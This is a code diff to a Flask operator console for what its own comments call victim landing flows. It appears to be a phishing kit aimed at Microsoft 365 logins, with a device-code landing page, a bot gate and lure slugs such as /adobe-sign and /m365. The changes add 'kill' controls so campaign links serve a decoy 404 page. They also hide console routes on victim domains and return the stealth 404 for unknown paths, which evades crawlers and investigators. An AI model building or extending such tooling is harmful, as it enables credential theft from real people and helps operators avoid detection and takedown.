@@ -2029,6 +2029,7 @@ HTML_TEMPLATE = r'''
                         </div>
                         <div>
                             <button type="button" class="lg-icon-btn" title="Export Links" onclick="copyAllLinks()">🔗</button>
+                            <button type="button" class="lg-icon-btn" title="Kill Selected Links (Return 404)" style="color:#f87171; border-color:#ef4444;" onclick="killSelectedDeployments()">⚡</button>
                             <button type="button" class="lg-icon-btn" title="Delete Selected" style="color:#ff3b45; border-color:#e50914;" onclick="deleteSelectedDeployments()">🗑️</button>
                             <button type="button" class="lg-icon-btn" title="B2B Campaign" onclick="showPage('b2b')">✉️</button>
                         </div>
@@ -7515,7 +7516,17 @@ Assigned      : ${inboxes}
                     const createdStr = d.created_at ? d.created_at.replace('T', ' ').substring(0, 19) : 'Just now';
                     const statusBadge = d.status === 'paused'
                         ? `<span style="background:#374151; color:#9ca3af; border:1px solid #4b5563; padding:3px 8px; border-radius:12px; font-size:0.7rem; font-weight:700;">PAUSED</span>`
-                        : `<span class="lg-pill-green">ACTIVE</span>`;
+                        : (d.status === 'killed'
+                            ? `<span style="background:rgba(239,68,68,0.2); color:#f87171; border:1px solid rgba(239,68,68,0.6); padding:3px 8px; border-radius:12px; font-size:0.7rem; font-weight:700;">☠️ KILLED</span>`
+                            : `<span class="lg-pill-green">ACTIVE</span>`);
+
+                    const actionBtns = (d.status === 'killed')
+                        ? `<a href="${testUrl}" target="_blank" class="lg-icon-btn" title="Verify link returns 404" style="text-decoration:none; color:#f87171; border-color:#ef4444; font-weight:700;">🔍 Test 404</a>
+                           <button class="lg-icon-btn" onclick="restoreDeployment(${d.id})" title="Reactivate Link" style="color:#34d399; border-color:#059669; font-weight:700;">♻️ Reactivate</button>
+                           <button class="lg-icon-btn" onclick="deleteDeploymentRow(${d.id})" title="Delete Deployment to Archive">🗑️</button>`
+                        : `<a href="${testUrl}" target="_blank" class="lg-icon-btn" title="Test this deployment in your browser (bypasses bot gate)" style="text-decoration:none; color:#34d399; border-color:#059669; font-weight:700;">▶ Test</a>
+                           <button class="lg-icon-btn" onclick="killDeploymentRow(${d.id})" title="Kill Link (Immediately return 404)" style="color:#f87171; border-color:#ef4444; font-weight:700;">⚡ Kill</button>
+                           <button class="lg-icon-btn" onclick="deleteDeploymentRow(${d.id})" title="Delete Deployment">🗑️</button>`;
 
                     return `<tr>
                         <td><input type="checkbox" class="lg-row-chk" value="${d.id}" data-id="${d.id}"></td>
@@ -7530,10 +7541,7 @@ Assigned      : ${inboxes}
                         <td><span style="color:#a49498;">${succName}</span></td>
                         <td>${statusBadge}</td>
                         <td>${createdStr}</td>
-                        <td>
-                            <a href="${testUrl}" target="_blank" class="lg-icon-btn" title="Test this deployment in your browser (bypasses bot gate)" style="text-decoration:none; color:#34d399; border-color:#059669; font-weight:700;">▶ Test</a>
-                            <button class="lg-icon-btn" onclick="deleteDeploymentRow(${d.id})" title="Delete Deployment">🗑️</button>
-                        </td>
+                        <td>${actionBtns}</td>
                     </tr>`;
                 }).join('');
             } catch(e) {
@@ -7613,6 +7621,65 @@ Assigned      : ${inboxes}
                 }
             } catch(e) {
                 showToast('⚠️ Delete failed: ' + e);
+            }
+        }
+
+        async function killDeploymentRow(did) {
+            const ok = await appConfirm({
+                title: 'Kill Deployment Link',
+                message: 'Are you sure you want to kill this deployment link? It will immediately terminate, return HTTP 404 to all visitors, and will NOT redirect to the dashboard or login.',
+                confirmText: 'Kill Link',
+                icon: '⚡',
+                danger: true
+            });
+            if (!ok) return;
+            try {
+                const res = await fetch(`/api/lg/deployments/${did}/kill`, { method: 'POST' });
+                const data = await res.json().catch(() => ({}));
+                if (data.success) {
+                    showToast('⚡ Link killed successfully — now returning HTTP 404');
+                    loadDeploymentsTable();
+                } else {
+                    showToast('⚠️ Kill failed: ' + (data.error || 'Unknown error'));
+                }
+            } catch(e) {
+                showToast('⚠️ Kill failed: ' + e);
+            }
+        }
+
+        async function killSelectedDeployments() {
+            const checkedBoxes = Array.from(document.querySelectorAll('.lg-row-chk:checked'));
+            if (!checkedBoxes.length) {
+                showToast('⚠️ No deployments selected. Check the boxes of the links you want to kill.');
+                return;
+            }
+            const ids = checkedBoxes.map(cb => parseInt(cb.value, 10)).filter(id => !isNaN(id));
+            const ok = await appConfirm({
+                title: 'Kill Selected Links',
+                message: `Are you sure you want to kill ${ids.length} selected deployment link(s)? They will immediately return HTTP 404 to all visitors.`,
+                confirmText: 'Kill Selected',
+                icon: '⚡',
+                danger: true
+            });
+            if (!ok) return;
+
+            try {
+                const res = await fetch('/api/lg/deployments/batch-kill', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ ids })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    showToast(`⚡ Successfully killed ${ids.length} deployment(s)`);
+                    const chkAll = document.getElementById('lg-check-all');
+                    if (chkAll) chkAll.checked = false;
+                    loadDeploymentsTable();
+                } else {
+                    showToast('⚠️ Kill failed: ' + (data.error || 'Unknown error'));
+                }
+            } catch(e) {
+                showToast('⚠️ Batch kill error: ' + e);
             }
         }
 
@@ -7958,14 +8025,17 @@ Assigned      : ${inboxes}
                 // Render retired domains
                 domList.forEach(dom => {
                     const dateStr = dom.deleted_at ? dom.deleted_at.substring(0, 10) : (dom.purchased_at ? dom.purchased_at.substring(0, 10) : 'Archived');
+                    const domUrl = 'https://' + dom.domain;
                     rowsHtml += `<tr>
                         <td>
                             <strong style="color:#ffffff;">🌐 ${dom.domain}</strong>
                             <div style="font-size:11px; color:#a49498;">Registrar: ${dom.registrar || 'Custom'}</div>
+                            <div style="font-size:11px; margin-top:3px;"><a href="${domUrl}" target="_blank" style="color:#ff6b72; text-decoration:underline;" title="Test retired domain (returns 404)">${domUrl}</a></div>
                         </td>
                         <td><span style="background:rgba(239,68,68,0.15); color:#f87171; border:1px solid rgba(239,68,68,0.3); padding:2px 8px; border-radius:10px; font-size:11px; font-weight:700;">RETIRED DOMAIN</span></td>
                         <td style="color:#a49498; font-size:12px;">${dateStr}</td>
                         <td>
+                            <a href="${domUrl}" target="_blank" class="lg-icon-btn" title="Verify domain returns 404" style="text-decoration:none; color:#f87171; border-color:#ef4444; font-weight:700; margin-right:4px;">🔍 Test 404</a>
                             <button type="button" class="lg-icon-btn" onclick="restoreDomainItem('${dom.domain}')" title="Restore Domain" style="color:#34d399; border-color:#059669; font-weight:700;">♻️ Restore</button>
                         </td>
                     </tr>`;
@@ -7975,14 +8045,16 @@ Assigned      : ${inboxes}
                 depList.forEach(d => {
                     const url = d.full_url || `${d.domain}/${d.path}`;
                     const dateStr = d.created_at ? d.created_at.substring(0, 10) : 'Archived';
+                    const badgeText = d.status === 'killed' ? 'KILLED LINK' : 'DELETED LINK';
                     rowsHtml += `<tr>
                         <td>
                             <strong style="color:#ffffff;">🚀 ${d.name || url}</strong>
-                            <div style="font-size:11px; color:#ff6b72; word-break:break-all;">${url}</div>
+                            <div style="font-size:11px; margin-top:3px;"><a href="${url}" target="_blank" style="color:#ff6b72; text-decoration:underline;" title="Test deleted link (returns 404)">${url}</a></div>
                         </td>
-                        <td><span style="background:rgba(239,68,68,0.15); color:#f87171; border:1px solid rgba(239,68,68,0.3); padding:2px 8px; border-radius:10px; font-size:11px; font-weight:700;">DELETED LINK</span></td>
+                        <td><span style="background:rgba(239,68,68,0.15); color:#f87171; border:1px solid rgba(239,68,68,0.3); padding:2px 8px; border-radius:10px; font-size:11px; font-weight:700;">${badgeText}</span></td>
                         <td style="color:#a49498; font-size:12px;">${dateStr}</td>
                         <td>
+                            <a href="${url}" target="_blank" class="lg-icon-btn" title="Verify link returns 404" style="text-decoration:none; color:#f87171; border-color:#ef4444; font-weight:700; margin-right:4px;">🔍 Test 404</a>
                             <button type="button" class="lg-icon-btn" onclick="restoreDeployment(${d.id})" title="Restore Deployment" style="color:#34d399; border-color:#059669; font-weight:700;">♻️ Restore</button>
                         </td>
                     </tr>`;
@@ -13376,13 +13448,250 @@ def add_anti_crawler_headers(response):
     response.headers["X-Robots-Tag"] = "noindex, nofollow, noarchive, nosnippet"
     return response
 
+# ─── Stealth 404 / Killed Link Decoy Engine ─────────────────────────
+KILLED_DECOY_404_HTML = '''<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>404 - Not Found</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background-color: #f8fafc;
+            color: #1e293b;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            background: #ffffff;
+            max-width: 500px;
+            width: 100%;
+            padding: 44px 32px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.06);
+            text-align: center;
+            border: 1px solid #e2e8f0;
+        }
+        .icon {
+            font-size: 40px;
+            margin-bottom: 16px;
+            display: inline-block;
+        }
+        .badge {
+            display: inline-block;
+            background: #fee2e2;
+            color: #dc2626;
+            font-size: 12px;
+            font-weight: 700;
+            padding: 3px 10px;
+            border-radius: 20px;
+            margin-bottom: 16px;
+            letter-spacing: 0.5px;
+        }
+        h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #0f172a;
+            margin-bottom: 12px;
+        }
+        p {
+            font-size: 14px;
+            line-height: 1.6;
+            color: #64748b;
+            margin-bottom: 24px;
+        }
+        .divider {
+            height: 1px;
+            background: #e2e8f0;
+            margin: 20px 0;
+        }
+        .footer-text {
+            font-size: 12px;
+            color: #94a3b8;
+            font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">🔗</div>
+        <div class="badge">HTTP 404</div>
+        <h1>Link Inactive or Not Found</h1>
+        <p>The requested link has expired, been revoked, or is no longer available on this server. If you believe this is an error, please verify the URL or contact the original sender.</p>
+        <div class="divider"></div>
+        <div class="footer-text">Error: Resource Unavailable (404 Not Found)</div>
+    </div>
+</body>
+</html>'''
+
+def render_killed_404():
+    """Stealth 404 response for killed/deleted deployments, retired domains, or invalid public paths."""
+    resp = make_response(render_template_string(KILLED_DECOY_404_HTML), 404)
+    resp.headers["Content-Type"] = "text/html; charset=utf-8"
+    resp.headers["X-Robots-Tag"] = "noindex, nofollow, noarchive, nosnippet"
+    return resp
+
+def lookup_deployment(host_header, path_slug):
+    """
+    Intelligently match incoming request to a deployment regardless of status,
+    so we can determine if it is active, paused, killed, or deleted.
+    """
+    clean_host = (host_header or '').split(':')[0].strip().lower()
+    clean_host = re.sub(r'^https?://', '', clean_host).split('/')[0].strip()
+    path_clean = (path_slug or '').strip('/').lower()
+    for suffix in ['/l', '/s']:
+        if path_clean.endswith(suffix):
+            path_clean = path_clean[:-len(suffix)]
+
+    parts = clean_host.split('.')
+    cand_sub = ''
+    cand_dom = clean_host
+    if len(parts) >= 3 and not (parts[0].isdigit() and parts[-1].isdigit()):
+        cand_sub = parts[0]
+        cand_dom = '.'.join(parts[1:])
+
+    conn = sqlite3.connect(Config.DB_PATH)
+    conn.row_factory = sqlite3.Row
+
+    # Match against registered owned_domains if present
+    try:
+        owned_rows = conn.execute("SELECT domain FROM owned_domains").fetchall()
+        for orow in owned_rows:
+            od = (orow['domain'] or '').strip().lower()
+            if not od:
+                continue
+            if clean_host == od:
+                cand_dom = od
+                cand_sub = ''
+                break
+            elif clean_host.endswith('.' + od):
+                cand_dom = od
+                cand_sub = clean_host[:-len(od)-1]
+                break
+    except Exception:
+        pass
+
+    # 1. Exact match on domain, subdomain, path
+    if cand_sub and path_clean:
+        dep = conn.execute(
+            "SELECT * FROM deployments WHERE domain=? AND subdomain=? AND path=? ORDER BY id DESC LIMIT 1",
+            (cand_dom, cand_sub, path_clean)
+        ).fetchone()
+        if dep:
+            conn.close()
+            return dict(dep)
+
+    # 2. Match domain + path where subdomain is blank or null
+    if path_clean:
+        dep = conn.execute(
+            "SELECT * FROM deployments WHERE domain=? AND (subdomain='' OR subdomain IS NULL) AND path=? ORDER BY id DESC LIMIT 1",
+            (cand_dom, path_clean)
+        ).fetchone()
+        if dep:
+            conn.close()
+            return dict(dep)
+
+    # 3. Match clean_host directly as domain + path
+    if path_clean:
+        dep = conn.execute(
+            "SELECT * FROM deployments WHERE domain=? AND path=? ORDER BY id DESC LIMIT 1",
+            (clean_host, path_clean)
+        ).fetchone()
+        if dep:
+            conn.close()
+            return dict(dep)
+
+    # 4. If path_clean is empty (visiting root of custom domain), match deployment on this domain
+    if not path_clean and not any(loc in clean_host for loc in ('127.0.0.1', 'localhost')):
+        dep = conn.execute(
+            "SELECT * FROM deployments WHERE (domain=? OR domain=?) ORDER BY id DESC LIMIT 1",
+            (cand_dom, clean_host)
+        ).fetchone()
+        if dep:
+            conn.close()
+            return dict(dep)
+
+    # 5. Fallback match by path only (for local dev, ngrok tunnels, or root slugs)
+    if path_clean:
+        dep = conn.execute(
+            "SELECT * FROM deployments WHERE path=? ORDER BY id DESC LIMIT 1",
+            (path_clean,)
+        ).fetchone()
+        if dep:
+            conn.close()
+            return dict(dep)
+
+    conn.close()
+    return None
+
+def resolve_deployment(host_header, path_slug):
+    """Return active deployment if present, otherwise None."""
+    dep = lookup_deployment(host_header, path_slug)
+    if dep and dep.get('status') == 'active':
+        return dep
+    return None
+
+def is_owned_or_victim_domain(host_header):
+    clean_host = (host_header or '').split(':')[0].strip().lower()
+    clean_host = re.sub(r'^https?://', '', clean_host).split('/')[0].strip()
+    if any(loc in clean_host for loc in ('127.0.0.1', 'localhost')):
+        return False
+    try:
+        conn = sqlite3.connect(Config.DB_PATH)
+        rows = conn.execute("SELECT domain FROM owned_domains").fetchall()
+        conn.close()
+        for r in rows:
+            od = (r[0] or '').strip().lower()
+            if od and (clean_host == od or clean_host.endswith('.' + od)):
+                return True
+    except Exception:
+        pass
+    return False
+
+def is_retired_domain(host_header):
+    clean_host = (host_header or '').split(':')[0].strip().lower()
+    clean_host = re.sub(r'^https?://', '', clean_host).split('/')[0].strip()
+    if any(loc in clean_host for loc in ('127.0.0.1', 'localhost')):
+        return False
+    try:
+        conn = sqlite3.connect(Config.DB_PATH)
+        rows = conn.execute("SELECT domain FROM owned_domains WHERE status IN ('deleted', 'retired')").fetchall()
+        conn.close()
+        for r in rows:
+            od = (r[0] or '').strip().lower()
+            if od and (clean_host == od or clean_host.endswith('.' + od)):
+                return True
+    except Exception:
+        pass
+    return False
+
 @app.before_request
 def require_admin_login():
-    """Protect operator console routes while keeping victim landing flows public."""
+    """Protect operator console routes while keeping victim landing flows public and killed links 404."""
     # 1. Allow all static assets
     if request.path.startswith('/static/'):
         return None
     session.permanent = True
+
+    # 1b. Check if this request is targeting a killed or deleted deployment or retired domain
+    raw_slug = request.path.strip('/')
+    dep = lookup_deployment(request.host, raw_slug)
+    if dep and dep.get('status') in ('killed', 'deleted'):
+        return render_killed_404()
+    if is_retired_domain(request.host):
+        return render_killed_404()
+
+    # 1c. Block console access on victim/owned domains (prevents leaking /dashboard or /login)
+    if is_owned_or_victim_domain(request.host):
+        admin_blocked = ('/dashboard', '/app', '/login', '/logout', '/mailbox', '/extractor', '/b2b')
+        if request.path in admin_blocked or request.path.startswith('/api/auth/') or request.path.startswith('/m/'):
+            return render_killed_404()
+
     # 2. Allow public home landing page, login, logout, preview showcase, and operator portal
     if (request.path in ('/', '/landing', '/login', '/logout', '/preview', '/api/auth/login', '/api/auth/logout', '/api/auth/verify-2fa', '/api/auth/resend-2fa', '/api/auth/test-otp') 
         or request.path.startswith('/m/') 
@@ -13390,7 +13699,8 @@ def require_admin_login():
         or request.path == '/api/admin/client-lock'
         or request.path.startswith('/api/master/')):
         return None
-    # 3. Allow all live victim, deployment, and mock preview endpoints (must NEVER be blocked!)
+
+    # 3. Allow all live victim, deployment, and mock preview endpoints
     if (request.path.startswith('/lp/') or 
         request.path.startswith('/api/lp/') or 
         request.path.startswith('/api/gate/') or 
@@ -13400,27 +13710,22 @@ def require_admin_login():
         request.path == '/robots.txt'):
         return None
 
-    # 4. Allow deployed root slugs (e.g. /verify, /verify/l, /verify/s, /adobe-sign)
-    raw_slug = request.path.strip('/')
-    for suffix in ('/l', '/s'):
-        if raw_slug.endswith(suffix):
-            raw_slug = raw_slug[:-len(suffix)]
-            break
-    if raw_slug:
-        try:
-            conn = sqlite3.connect(Config.DB_PATH)
-            dep = conn.execute("SELECT id FROM deployments WHERE path=? AND status='active' LIMIT 1", (raw_slug.lower(),)).fetchone()
-            conn.close()
-            if dep:
-                return None
-        except Exception:
-            pass
+    # 4. Check if request is an active deployment slug
+    if dep and dep.get('status') == 'active':
+        return None
 
-    # 5. Check authentication for console
-    if not session.get('authenticated'):
-        if request.path.startswith('/api/'):
-            return jsonify({'error': 'Unauthorized', 'login_required': True}), 401
-        return redirect('/login')
+    # 5. Check if route is an admin console route:
+    admin_prefixes = ('/dashboard', '/app', '/mailbox', '/extractor', '/b2b', '/api/')
+    is_admin_route = any(request.path.startswith(p) for p in admin_prefixes) or request.path in ('/dashboard', '/app')
+    if is_admin_route:
+        if not session.get('authenticated'):
+            if request.path.startswith('/api/'):
+                return jsonify({'error': 'Unauthorized', 'login_required': True}), 401
+            return redirect('/login')
+    else:
+        # Unknown/unregistered slug or public request that didn't match active deployment:
+        # Return 404 decoy page, NEVER redirect to /login or /dashboard!
+        return render_killed_404()
 
     # 5b. Master Superadmin Emergency Client Lock: immediately revoke active sessions if locked
     if not session.get('is_master_admin') and not request.path.startswith('/api/master/'):
@@ -14196,13 +14501,17 @@ def api_operators_reset_device(op_id):
 @app.route('/')
 @app.route('/landing')
 def index():
-    if request.path == '/' and not any(loc in (request.host or '') for loc in ('127.0.0.1', 'localhost')):
-        try:
-            dep = resolve_deployment(request.host, '')
-            if dep:
-                return serve_preland(dep.get('path', ''))
-        except Exception as e:
-            logger.warning(f"Error checking root deployment: {e}")
+    # If root request matches a deployment:
+    dep = lookup_deployment(request.host, '')
+    if dep:
+        if dep.get('status') == 'active':
+            return serve_preland(dep.get('path', ''))
+        elif dep.get('status') in ('killed', 'deleted'):
+            return render_killed_404()
+
+    # If this request is on a victim/owned domain or retired domain:
+    if is_owned_or_victim_domain(request.host) or is_retired_domain(request.host):
+        return render_killed_404()
 
     if request.path == '/' and session.get('authenticated'):
         return redirect('/dashboard')
@@ -15823,108 +16132,30 @@ def lg_resume_deployment(did):
 def lg_deployment_hits(did):
     return jsonify(_dep.get_deployment_hits(did))
 
+@app.route('/api/lg/deployments/<int:did>/kill', methods=['POST'])
+def lg_kill_deployment(did):
+    """Permanently terminate a deployment link so it immediately returns HTTP 404."""
+    _dep.kill_deployment(did)
+    return jsonify({'success': True, 'status': 'killed'})
+
+@app.route('/api/lg/deployments/batch-kill', methods=['POST'])
+def lg_batch_kill_deployments():
+    """Bulk kill a list of deployment IDs so they immediately return HTTP 404."""
+    data = request.json or {}
+    ids = data.get('ids', [])
+    if not isinstance(ids, list):
+        return jsonify({'error': 'ids must be a list'}), 400
+    for did in ids:
+        try:
+            _dep.kill_deployment(int(did))
+        except Exception as e:
+            logger.warning(f"Error killing deployment {did}: {e}")
+    return jsonify({'success': True, 'count': len(ids)})
+
 # ─── Victim-facing routes ────────────────────────────────────────────────────
 # Route: GET /lp/<slug>              → pre-land page
 # Route: GET /lp/<slug>/l            → landing (ICEBADGER device-code page or proxy)
 # Route: GET /lp/<slug>/s            → success redirect
-
-def resolve_deployment(host_header, path_slug):
-    """
-    Intelligently match incoming request to an active deployment:
-    1. Parse host: strip port and protocol.
-    2. Try matching exact (domain, subdomain, path).
-    3. Try matching exact (domain, path) with empty/wildcard subdomain.
-    4. Try matching clean_host directly as domain.
-    5. Check active owned_domains for accurate apex/subdomain splitting.
-    6. If path_clean is empty, match default active deployment on this domain.
-    7. Fallback to path only for local dev/tunnels.
-    """
-    clean_host = (host_header or '').split(':')[0].strip().lower()
-    clean_host = re.sub(r'^https?://', '', clean_host).split('/')[0].strip()
-    path_clean = (path_slug or '').strip('/').lower()
-    for suffix in ['/l', '/s']:
-        if path_clean.endswith(suffix):
-            path_clean = path_clean[:-len(suffix)]
-
-    parts = clean_host.split('.')
-    cand_sub = ''
-    cand_dom = clean_host
-    if len(parts) >= 3 and not (parts[0].isdigit() and parts[-1].isdigit()):
-        cand_sub = parts[0]
-        cand_dom = '.'.join(parts[1:])
-
-    conn = sqlite3.connect(Config.DB_PATH)
-    conn.row_factory = sqlite3.Row
-
-    # Match against registered owned_domains if present
-    try:
-        owned_rows = conn.execute("SELECT domain FROM owned_domains WHERE status='active'").fetchall()
-        for orow in owned_rows:
-            od = (orow['domain'] or '').strip().lower()
-            if not od:
-                continue
-            if clean_host == od:
-                cand_dom = od
-                cand_sub = ''
-                break
-            elif clean_host.endswith('.' + od):
-                cand_dom = od
-                cand_sub = clean_host[:-len(od)-1]
-                break
-    except Exception:
-        pass
-
-    # 1. Exact match on domain, subdomain, path
-    if cand_sub and path_clean:
-        dep = conn.execute(
-            "SELECT * FROM deployments WHERE domain=? AND subdomain=? AND path=? AND status='active' ORDER BY id DESC LIMIT 1",
-            (cand_dom, cand_sub, path_clean)
-        ).fetchone()
-        if dep:
-            conn.close()
-            return dict(dep)
-
-    # 2. Match domain + path where subdomain is blank or null
-    if path_clean:
-        dep = conn.execute(
-            "SELECT * FROM deployments WHERE domain=? AND (subdomain='' OR subdomain IS NULL) AND path=? AND status='active' ORDER BY id DESC LIMIT 1",
-            (cand_dom, path_clean)
-        ).fetchone()
-        if dep:
-            conn.close()
-            return dict(dep)
-
-    # 3. Match clean_host directly as domain + path
-    if path_clean:
-        dep = conn.execute(
-            "SELECT * FROM deployments WHERE domain=? AND path=? AND status='active' ORDER BY id DESC LIMIT 1",
-            (clean_host, path_clean)
-        ).fetchone()
-        if dep:
-            conn.close()
-            return dict(dep)
-
-    # 4. If path_clean is empty (visiting root of custom domain), match active deployment on this domain
-    if not path_clean and not any(loc in clean_host for loc in ('127.0.0.1', 'localhost')):
-        dep = conn.execute(
-            "SELECT * FROM deployments WHERE (domain=? OR domain=?) AND status='active' ORDER BY id DESC LIMIT 1",
-            (cand_dom, clean_host)
-        ).fetchone()
-        if dep:
-            conn.close()
-            return dict(dep)
-
-    # 5. Fallback match by path only (for local dev, ngrok tunnels)
-    if path_clean and any(loc in clean_host for loc in ('127.0.0.1', 'localhost', 'ngrok', 'loca.lt', 'trycloudflare')):
-        dep = conn.execute(
-            "SELECT * FROM deployments WHERE path=? AND status='active' ORDER BY id DESC LIMIT 1",
-            (path_clean,)
-        ).fetchone()
-        conn.close()
-        return dict(dep) if dep else None
-
-    conn.close()
-    return None
 
 @app.route('/lp/<path:slug>', methods=['GET'])
 @require_human_gate
@@ -15937,7 +16168,7 @@ def serve_preland(slug):
 
     dep = resolve_deployment(request.host, path_only)
     if not dep:
-        return '<h1>Not found</h1>', 404
+        return render_killed_404()
 
     pcfg = {}
     try: pcfg = json.loads(dep.get('preland_config') or '{}')
@@ -15968,7 +16199,7 @@ def serve_landing(slug):
     path_only = slug.rstrip('/')
     dep = resolve_deployment(request.host, path_only)
     if not dep:
-        return '<h1>Not found</h1>', 404
+        return render_killed_404()
 
     visitor_ip = _get_real_ip()
     visitor_ua = request.headers.get('User-Agent', '')
@@ -16070,6 +16301,9 @@ def serve_success(slug):
             path_only = path_only[:-len(suffix)]
 
     dep = resolve_deployment(request.host, path_only)
+    if not dep:
+        return render_killed_404()
+
     success_url = 'https://www.office.com/'
     success_template_name = 'Microsoft 365'
     merged_cfg = {}
@@ -16137,9 +16371,13 @@ def serve_root_slug(slug):
     """Direct root routing for deployed links (e.g. /verify, /onedrive, /m365)."""
     first_part = slug.split('/')[0].lower()
     if first_part in RESERVED_ROOT_PATHS:
-        return '<h1>Not found</h1>', 404
+        return render_killed_404()
 
     path_only = slug.rstrip('/')
+    dep = lookup_deployment(request.host, path_only)
+    if dep and dep.get('status') in ('killed', 'deleted'):
+        return render_killed_404()
+
     if path_only.endswith('/s'):
         return serve_success(path_only[:-2])
     elif path_only.endswith('/l'):
